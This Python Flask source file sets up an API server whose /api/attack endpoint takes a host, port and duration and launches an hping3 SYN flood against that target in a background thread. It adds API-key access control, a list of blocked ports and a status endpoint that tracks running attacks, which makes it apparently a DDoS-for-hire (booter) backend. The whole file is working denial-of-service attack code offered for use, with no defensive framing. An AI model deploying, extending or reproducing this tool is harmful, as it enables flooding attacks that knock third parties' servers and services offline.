# api_server.py
from flask import Flask, request, jsonify
import subprocess
import os
import threading
import time

app = Flask(__name__)

# Config from env vars
API_KEY = os.environ.get("API_KEY", "your-secret-key-here")
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]

active_attacks = {}

@app.route('/api/attack', methods=['GET'])
def attack():
    key = request.args.get('key')
    host = request.args.get('host')
    port = request.args.get('port')
    time_duration = request.args.get('time')
    
    # Auth check
    if key != API_KEY:
        return jsonify({"error": "Invalid API Key"}), 403
    
    # Port check
    try:
        port_int = int(port)
        if port_int in BLOCKED_PORTS:
            return jsonify({"error": "Port is blocked"}), 400
    except:
        return jsonify({"error": "Invalid port"}), 400
    
    # Start attack in background thread
    attack_id = f"{host}:{port}:{int(time.time())}"
    active_attacks[attack_id] = {
        "host": host,
        "port": port,
        "time": time_duration,
        "started": time.time()
    }
    
    # Launch attack
    def run_attack():
        try:
            cmd = f"hping3 -S -p {port} --flood {host}"
            subprocess.run(cmd.split(), timeout=int(time_duration))
        except:
            pass
        finally:
            active_attacks.pop(attack_id, None)
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "status": "attack_sent",
        "host": host,
        "port": port,
        "time": time_duration,
        "attack_id": attack_id
    })

@app.route('/api/status', methods=['GET'])
def status():
    key = request.args.get('key')
    if key != API_KEY:
        return jsonify({"error": "Invalid API Key"}), 403
    
    return jsonify({
        "running_attacks": len(active_attacks),
        "attacks": list(active_attacks.values())
    })

@app.route('/')
def index():
    return jsonify({"status": "API Server Running"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
